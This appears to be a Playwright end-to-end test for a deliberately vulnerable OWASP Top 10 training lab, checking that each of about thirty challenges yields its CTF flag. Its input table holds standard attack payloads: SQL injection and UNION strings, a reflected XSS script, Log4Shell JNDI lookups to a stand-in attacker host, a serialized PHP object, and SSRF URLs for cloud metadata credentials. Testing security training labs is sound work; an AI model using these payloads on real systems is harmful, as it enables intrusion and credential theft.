const { test, expect } = require('@playwright/test');

const LAB_SUITE_TIMEOUT_MS = 60_000;

const LABS = [
  ['a01-idor-order',     { '#a01-id': '100' },                                              ['a01Fetch']],
  ['a01-mass-enum',      {},                                                                 ['a01EnumAll']],
  ['a01-vert-priv',      { '#a01v-body': '{"name":"alice","role":"admin"}' },                ['a01Promote']],

  ['a02-jwt-none',       {},                                                                 ['a02None', 'a02VerifyNone']],
  ['a02-weak-secret',    { '#a02w-sec': 'secret', '#a02w-role': 'admin' },                   ['a02WeakSign']],
  ['a02-claim-tamper',   { CHECK: '#a02d-dbg' },                                             ['a02dAdmin', 'a02dVerify']],

  ['a03-sqli-bypass',    { '#a03-user': "admin'--", '#a03-pass': 'x' },                      ['a03Login']],
  ['a03-xss-reflected',  { '#a03x-q': '<script>alert(1)</script>' },                         ['a03Xss']],
  ['a03-sqli-union',     { '#a03u-user': "' UNION SELECT key_name,secret_value,null FROM secrets--" }, ['a03Union']],

  ['a04-otp-brute',      {},                                                                 ['a04Brute']],
  ['a04-sec-question',   { '#a04s-ans': 'springfield' },                                     ['a04SecQ']],
  ['a04-neg-balance',    { '#a04b-q': '-5' },                                                ['a04Biz']],

  ['a05-debug-leak',     {},                                                                 ['a05Crash']],
  ['a05-cors-star',      { '#a05c-ans': 'Access-Control-Allow-Origin * with credentials' },  ['a05Headers', 'a05CorsSubmit']],
  ['a05-default-creds',  { '#a05d-u': 'admin', '#a05d-p': 'admin' },                         ['a05Default']],

  ['a06-log4shell',      { '#a06-ua': '${jndi:ldap://attacker/a}' },                         ['a06Send']],
  ['a06-sbom-cve',       { '#a06s-cve': 'CVE-2021-44228' },                                  ['a06Sbom']],
  ['a06-jndi-bypass',    { '#a06b-ua': '${${lower:j}ndi:ldap://attacker/a}' },               ['a06Bypass']],

  ['a07-session-forge',  {},                                                                 ['a07Login', 'a07Forge', 'a07Me']],
  ['a07-stuffing',       { '#a07s-u': 'bob', '#a07s-p': 'password' },                        ['a07Stuff']],
  ['a07-no-mfa',         {},                                                                 ['a07MfaLogin', 'a07MfaSensitive']],

  ['a08-deser-role',     {},                                                                 ['a08Admin', 'a08Load']],
  ['a08-deser-id',       { '#a08i-c': 'O:4:"User":2:{s:4:"role";s:4:"user";s:2:"id";i:1;}' },['a08IdLoad']],
  ['a08-unsigned-update',{ '#a08p-url': 'http://evil.example/plugin.zip' },                  ['a08Plugin']],

  ['a09-hunt-ip',        { '#a09-ip': '185.220.101.47', '#a09-what': 'brute force' },        ['a09Ip']],
  ['a09-count-fails',    { '#a09c-n': '47' },                                                ['a09Count']],
  ['a09-exfil-table',    { '#a09t-t': 'customers' },                                         ['a09Table']],

  ['a10-imds',           { '#a10-url': 'http://169.254.169.254/latest/meta-data/iam/security-credentials/role' }, ['a10Fetch']],
  ['a10-localhost',      { '#a10l-url': 'http://127.0.0.1:8080/admin' },                     ['a10Local']],
  ['a10-fail-open',      { '#a10f-url': 'http://bad.invalid:1/' },                           ['a10Fail']],
];

test('every lab reproduces its vulnerability and awards the matching flag', async ({ page }, testInfo) => {
  testInfo.setTimeout(LAB_SUITE_TIMEOUT_MS);
  const errs = [];
  page.on('pageerror', e => errs.push('PAGEERROR: ' + e.message));
  page.on('console', m => { if (m.type() === 'error') errs.push('CONSOLE: ' + m.text()); });

  const expected = await page.goto('/app/#/lab/A01').then(() => page.evaluate(() =>
    Object.fromEntries((CHALLENGES.all ? CHALLENGES.all() : []).map(c => [c.id, c.flag]))));

  const rows = [];
  for (const [id, fills, handlers] of LABS) {
    const mod = id.slice(0, 3).toUpperCase();
    await page.goto(`/app/#/lab/${mod}`);
    await page.locator('#lab-tabs [data-tab="lab"]').click();
    const idx = LABS.filter(l => l[0].startsWith(mod.toLowerCase())).findIndex(l => l[0] === id);
    await page.locator('#chal-strip button').nth(idx).click();

    let err = null;
    try {
      for (const [sel, val] of Object.entries(fills)) { if (sel === 'CHECK') await page.locator(val).check({ timeout: 3000 }); else await page.locator(sel).fill(val, { timeout: 3000 }); }
      for (const h of handlers) {
        await page.locator(`#lab-dynamic [onclick*="${h}("]`).first().click({ timeout: 3000 });
        await page.waitForTimeout(120);
      }
      await page.waitForTimeout(400);
    } catch (e) { err = e.message.split('\n')[0]; }

    const got = ((await page.locator('#flag-area').textContent()).match(/FLAG\{[^}]*\}/) || [])[0] || null;
    rows.push({ id, got, want: expected[id] || null, err });
  }

  console.log('\nчеллендж              статус  флаг');
  let bad = 0;
  for (const r of rows) {
    const ok = r.got && (!r.want || r.got === r.want);
    if (!ok) bad++;
    console.log(r.id.padEnd(22) + (ok ? '  OK   ' : ' ПРОБЛ ') + (r.got || '—')
      + (r.want && r.got !== r.want ? `   ОЖИДАЛСЯ ${r.want}` : '') + (r.err ? '   ' + r.err : ''));
  }
  console.log(`\nвзято: ${rows.filter(r => r.got).length}/${rows.length}   несовпадений: ${bad}`);
  console.log('ошибки консоли: ' + (errs.join(' | ') || 'нет'));
  expect(bad, 'labs that did not award their flag').toBe(0);
  expect(errs).toEqual([]);
});
